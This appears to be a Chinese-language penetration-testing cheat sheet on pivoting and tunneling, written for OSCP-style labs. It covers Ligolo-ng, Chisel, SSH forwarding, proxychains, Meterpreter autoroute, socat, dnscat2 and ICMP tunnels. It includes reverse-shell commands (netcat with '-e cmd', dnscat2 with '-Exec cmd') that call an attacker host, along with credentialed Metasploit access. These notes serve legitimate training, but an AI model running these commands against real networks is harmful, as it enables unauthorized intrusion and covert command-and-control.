>[!NOTE]
>轉發技術跟通道技術

* 內網主機發現 : 可以用nmap binary或是bash掃描
``` bash
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; & done
```
[nmap掃描 ](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)
# Ligolo-ng
>[!NOTE]
>OSCP frandly工具，大大的推這個東西。可以不透過難用的socks來運作。
- [Github 連結](https://github.com/nicocha30/ligolo-ng)
## 轉發設定
>Ligolo-ng需要兩個東西，agent跟proxy，agent裝在Piovt Host，proxy放在kali linux裡面
### Kali端設定
- 開啟ligolo Interface
``` shell
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```
- 開啟proxy
``` shell
./proxy -selfcert
```
### Piovt Host端設定
``` shell
./agent.exe -connect 192.168.45.206:11601 -ignore-cert
```
### 開啟Piovt功能
當agent回連後，在kali端選擇session，並打`start`，就可以開始運作
- 新增Route，才可以用
``` shell
sudo ip route add 172.16.206.0/24 dev ligolo
```
### 開啟Local-Port Forwarding
只要加入`http://240.0.0.1/32`，就會自動做到轉發`127.0.0.1`的東西
```
sudo ip route add 240.0.0.1/32 dev ligolo
```
## Reverse Shell設定
>[!WARNING]
>當需要再某內網台轉發的主機做Reverse Shell的時候，沒辦法直接轉到自己的ip位置，但是可以用`listener`的功能。
### 目標機器
>需要把port指向Ligolo-ng開啟的port
``` shell
nc.exe -nv <kali ip address> <port> -e cmd
```
### Kali端設定 
>解釋 : 把1234監聽的東西轉發的4444
``` shell
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 --tcp
```
- 監聽 port 4444就可以收到reverse shell了
``` shell
rlwrap -cAr nc -lvnp 4444
```
- 檢視`listener`清單
```
listener_list
```
- 關閉`listener`
```
listener_stop 0
```
## File Transfer設定
>[!WARNING]
>當需要再某內網台轉發的主機做File Transfer的時候，沒辦法直接轉到自己的ip位置，但是可以用`listener`的功能。
### Kali端設定
>解釋 : 把1234監聽的東西轉發的8000
```
listener_add --addr 0.0.0.0:8888 --to 0.0.0.0:8000
```
- 開啟Web Server
```
python -m http.server 8000
```
# Chisel
>[!WARNING]
>要會的東西

[吉哈伯連結 ](https://github.com/jpillora/chisel/releases/tag/v1.9.1)
## 假設要把靶機的3306port轉發出來，又沒有ssh可以用
- Kali
```
./chisel_linux server --reverse  --port 9002
```
- 靶機
```
.\chisel_windows.exe client 10.10.14.9:9002 R:3306:localhost:3306
```

做完以上設定，在kali就可以透過`mysql -u root -p -h 127.0.0.1`存取靶機的127.0.0.1:3306

# 原生工具
>[!WARNING]
>用ssh做轉發不需要額外的工具，但是轉送比較難理解
## SSH
>[!NOTE]
>SSH可以在Windows、Linux上面執行
### SSH Local Port Forwarding
- 使用在目標主機有開127.0.0.1:3306的服務，我們須把他轉發出來
```shell-session
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```
- Local Port Forwarding可以同時轉發多個port
```shell-session
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```
- OSCP Command
```
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```
### SSH Dynamic Port Forwarding
- 透過9050 port，直接對外
```shell-session
ssh -D 9050 ubuntu@10.129.202.64
```
- OSCP Command
```
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```
### SSH Remote Port Forwarding
- 把`172.16.5.129(跟10.129.2.215同一台)`那台的8080port轉發出來到本地端的`8000`，這邊`0.0.0.0`就是指本地端
```
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.2.215
```
- OSCP Command
```
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```
### SSH Remote Dynamic Port Forwarding
- OSCP Command
```
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```
## 利用proxychain做Dynamic Forwarding
>[!WARNING]
>搭配SSH Dynamic Port Forwarding
- 修改proxychain設定檔 : 這個ip就是第一個跳板的ip位置
```
/etc/proxychains4.conf
```

```
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 192.168.50.63 9999
```
### 使用方法
```
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

```
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```
## proxychain可以幹嘛
> 考慮到proxychain的程式碼內容，只能轉發TCP-connect的方式，所以只有`-sT`可以用

| Namp 送封包方式 | proxychain可否轉發 |
| --------------- | ------------------ |
| TCP-connect     | 可                 |
| raw socket      | 不可               |
| pcap            | 不可               |
# Meterpreter的各種極限操作
>[!WARNING]
>Meterpreter可以快速建立Port Forwarding。
## 在Meterpreter裡面作Port Forwarding
- 透過Metasploit 建立ssh(只是範例，拿shell的方式很多)
```
use exploit/multi/ssh/sshexec 
set rhosts 172.19.19.70 
set username administrator 
set password Infinit3 
set lhost 172.19.19.18 
exploit
```
- 直接建立Port Forwarding
```
run post/multi/manage/autoroute OPTION=s 
run autoroute -p 
background
```
## 透過Metasploit 建立SOCKS Proxy
>  proxychains.conf 還是要設定好

- proxychains.conf設定
```shell-session
socks4 	127.0.0.1 9050
```
### 設定Socks Proxy
```shell-session
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```
### 把網段加入autoroute
```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```
### 直接在meterpreter裡面加入
```shell-session
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```
>[!NOTE]
>這個時候已經可以透過proxychain去運作所有軟體
- Portfwd : 可以讓其他程式不用打proxychain就直接用
```shell-session
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
# datapipe
[下載點](https://github.com/bovine/datapipe)
```
sudo ./datapipe 0.0.0.0 135 192.168.0.7 135 
sudo ./datapipe 0.0.0.0 445 192.168.0.7 445 
sudo ./datapipe 0.0.0.0 4444 172.19.19.18 4444
```
# socat
>[!WARNING]
>socat可以直接綁定中繼站的port跟攻擊機
>- TCP-LISTEN:8080 是中繼站開8080 常見port位 
>- 10.10.14.18是攻擊機，80 port 是攻擊機監聽的port位
```shell-session
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
- OSCP Command
```
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```
# sshuttle
>[!WARNING]
>可以直接把172.16.5.0/23加進來，處理起來很方便
- 假如`10.129.200.64`有連接到另一個網路`172.16.5.0/23`，可以直接透過sshuttle讓其他工具連到`172.16.5.0/23`
```shell-session
sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```
- OSCP Command
```
sshuttle -r database_admin@192.168.246.63:2222 10.4.246.0/24 172.16.246.0/24
```
# Plink.exe
```
plink.exe -ssh -l kali -pw kali -R 127.0.0.1:4445:127.0.0.1:3389 192.168.45.176
```
# Web Server Pivoting with Rpivot
![Pasted image](images/Pasted_image_20231216225529.png)
>[!WARNING]
>Rpivot 也是基於SOCKS的技術，他是使用python2.7，並且有server.py跟client.py，需要把整包傳輸到中繼站。
- [程式下載](https://github.com/klsecservices/rpivot.git)
## Server 端(Attack Host)
```shell-session
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
## Client 端 (Ubuntu )
> 在Ubuntu上面運作的client.py，會自動幫我們轉發`172.16.5.0/24`3306的服務，我們須把他轉發出來 
```shell-session
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```
## 利用proxychain開啟Webserver
```shell-session
proxychains firefox-esr 172.16.5.135:80
```
##  Connecting to a Web Server using HTTP-Proxy & NTLM Auth
```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
# netsh
>[!NOTE]
>netsh只能在windows上面使用，其實就很簡單，就是把哪個port近來，哪個ip近來，把哪個port出去，哪個ip出去寫清楚就好

![Pasted image](images/Pasted_image_20231217000056.png)
### 開啟netsh的轉發功能
```cmd-session
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```
### Verifying Port Forward
```cmd-session
C:\Windows\system32> netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.42.198   8080        172.16.5.25     3389
```


- OSCP Command netsh開啟轉發功能
```
netsh interface portproxy add v4tov4 listenport=2222 listenliten=192.168.239.64 connectport=22 connectlisten=10.4.239.215
```
- OSCP Command netsh開啟防火牆
```
netsh advfirewall firewall add rule name="port_forwarding" protocol=TCP dir=in localip=192.168.239.64 localport=2222 action=allow
```
# DNS Tunneling with Dnscat2
>[!WARNING]
>透過DNS Tunnel把內網資訊透過DNS tunnel轉發出來，可以拿shell，有Server跟Client端要設定。
## dnscat2 Server
- 程式下載
```shell-session
git clone https://github.com/iagox86/dnscat2.git
```
- 開啟Server
```shell-session
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
## dnscat2 Client
>[!WARNING]
>如果是windows主機，可以使用powershell版本
- 程式下載及安裝
```shell-session
git clone https://github.com/lukebaggett/dnscat2-powershell.git

cd dnscat2/server/ 
sudo gem install bundler 
sudo bundle install
```
- 設定Client
```powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1
```
```powershell-session
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```
## Established Session
```shell-session
dnscat2> window -i 1
```
# SOCKS5 Tunneling with Chisel
>[!WARNING]
>Chisel 就是很屌的工具，要先製作binary，
- 程式下載
```shell-session
git clone https://github.com/jpillora/chisel.git
```
- build binary
```shell-session
go build
```
```
go build --ldflags '-linkmode external -extldflags "-static"'
```
## Pivot Host
```shell-session
./chisel server -v -p 1234 --socks5
```
## 攻擊機
>須主動連線至Pivot Host
```shell-session
./chisel client -v 10.129.202.64:1234 socks
```
連上去會看到log跑出來，這時候就可以依照log修改proxychain.conf
```shell-session
2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```
- /etc/proxychains.conf 設定
```shell-session
Alex-700@htb[/htb]$ tail -f /etc/proxychains.conf 

#

#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```
## 利用proxychains
```shell-session
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
# ICMP Tunneling with SOCKS
>[!WARNING]
>使用ptunnel-ng建構ICMP Tunnel，中繼最好是用Linux的機器
- 程式下載及安裝 
```shell-session
git clone https://github.com/utoni/ptunnel-ng.git
```
- 如果遇到`./autogen.sh: line 10: autoreconf: command not found`
```
sudo apt-get install autoconf
```
- 編譯ptunnel-ng (編譯完會產出ptunnel-ng.sh放在ptunnel-ng/src裡面) 
```shell-session
sudo ./autogen.sh 
```
- 整包要運送到Pivot裡面
```shell-session
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```
## 在Pivot Host開啟ptunnel-ng server
> -r是Pivot的ip位置
```shell-session
sudo ./ptunnel-ng -r10.129.202.64 -R22
```
## 攻擊機連線到ptunnel server
> -p跟-r是Pivot的ip位置
```shell-session
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```
- -p : ip Address of Target
- -l :  local port 2222
## 透過ICMP tunnel建立ssh連線 
### 一般SSH連線
```shell-session
ssh -p2222 -lubuntu 127.0.0.1
```
### SSH Dynamic Port Forwarding
```shell-session
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```
### Proxychaining 
```shell-session
proxychains nmap -sV -sT 172.16.5.19 -p3389
```